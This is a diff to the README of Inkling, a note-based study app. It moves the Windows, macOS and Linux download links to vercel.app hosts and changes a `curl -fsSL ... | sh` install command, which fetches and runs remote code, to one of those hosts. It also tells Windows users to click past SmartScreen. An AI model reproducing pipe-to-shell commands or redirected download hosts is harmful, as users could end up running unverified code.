@@ -10,7 +10,7 @@ Inkling is a desktop app for studying from your own notes: the to-dos and flashc
 
 ## Download
 
-**[Download Inkling for Windows](https://inkling.punds.ch)**, then double-click it. It installs and opens on its own, and there is no account to make.
+**[Download Inkling for Windows](https://portfolio-izanagi.vercel.app/projects/inkling)**, then double-click it. It installs and opens on its own, and there is no account to make.
 
 Windows may say "Windows protected your PC"; click More info, then Run anyway.
 
@@ -49,8 +49,8 @@ On a Mac, press `Cmd` where the table says `Ctrl`, and `Cmd+/` for all shortcuts
 
 ## Other ways to install
 
-- macOS, Intel and Apple Silicon: paste `curl -fsSL https://inkling.punds.ch/install | sh` into Terminal. It puts Inkling into Applications and opens it, and running it again updates it. You can also download [Inkling-mac.dmg](https://inkling.punds.ch), open it and drag Inkling into Applications; macOS then asks you to allow it once under System Settings, Privacy & Security.
-- Linux: [Inkling.AppImage](https://inkling.punds.ch). Make it executable with `chmod +x Inkling.AppImage`, then run it.
+- macOS, Intel and Apple Silicon: paste `curl -fsSL https://get-inkling.vercel.app/install | sh` into Terminal. It puts Inkling into Applications and opens it, and running it again updates it. You can also download [Inkling-mac.dmg](https://portfolio-izanagi.vercel.app/projects/inkling), open it and drag Inkling into Applications; macOS then asks you to allow it once under System Settings, Privacy & Security.
+- Linux: [Inkling.AppImage](https://portfolio-izanagi.vercel.app/projects/inkling). Make it executable with `chmod +x Inkling.AppImage`, then run it.
 - Every version is on the [releases page](https://github.com/dominikkoenitzer/Inkling/releases).
 
 ## Use it with an AI assistant
